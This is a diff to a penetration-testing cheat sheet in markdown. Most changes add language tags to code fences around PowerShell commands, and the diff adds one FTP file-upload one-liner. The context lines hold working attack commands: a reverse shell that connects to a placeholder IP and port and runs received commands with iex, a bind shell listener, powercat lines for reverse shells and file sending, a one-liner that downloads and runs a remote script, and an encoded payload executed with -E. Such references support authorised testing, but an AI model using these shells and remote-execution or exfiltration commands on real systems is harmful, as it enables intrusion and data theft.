@@ -793,7 +793,7 @@ $ socat - OPENSSL:<IP>:<PORT>,verify=0                                          
 ### <ins>PowerShell</ins>
 
 **Misc Commands**
-```
+```PowerShell
 Set-ExecutionPolicy Unrestricted                                                                        Set the PowerShell execution policy
 Get-ExecutionPolicy                                                                                     Get value for ExecutionPolicy
 (new-object System.Net.WebClient).DownloadFile('http://<IP>/<filename>','C:\<DIR>\<filename>')          Download a file
@@ -803,10 +803,10 @@ powershell -c "command"                                                         
 
 
 **Send a reverse shell with PowerShell**
-- ```
+- ```PowerShell
   powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   ```
-- ```
+- ```PowerShell
   $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
@@ -822,7 +822,7 @@ powershell -c "command"                                                         
   ```
 
 **Set up a bind shell with PowerShell**
-```
+```PowerShell
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
 
@@ -830,7 +830,7 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4
 
 Script: [powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1).
 
-```
+```PowerShell
 powercat -c <IP> -p <PORT> -i C:\<DIR>\powercat.ps1                     Send a file
 powercat -c <IP> -p <PORT> -e cmd.exe                                   Send a reverse shell
 powercat -l -p 443 -e cmd.exe                                           Set up a bind shell; -l option to create a listener, -p to specify the listening port number, -e to have an application executed once connected
@@ -839,14 +839,20 @@ powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1     Create a
 ```
 
 **Load a remote PowerShell script using iex**
-```
+```PowerShell
 iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 ```
 
 **Execute an encoded stand-alone payload using PowerShell**
-```
+```PowerShell
 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHI...
 ```
+
+**Upload a file to an FTP server**
+```PowerShell
+$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPLOAD>"); $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("<USERNAME>", "<PASSWORD>"); $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $fileContents = [System.IO.File]::ReadAllBytes((Resolve-Path "test.zip")); $ftpRequest.ContentLength = $fileContents.Length; $requestStream = $ftpRequest.GetRequestStream(); $requestStream.Write($fileContents, 0, $fileContents.Length); $requestStream.Close(); $response = $ftpRequest.GetResponse(); $response.Close()
+```
+- Change `<IP>`, `<PORT>`, `<FILE_TO_UPLOAD>`, `<USERNAME>`, `<PASSWORD>`
 
 
 ### <ins>WireShark</ins>
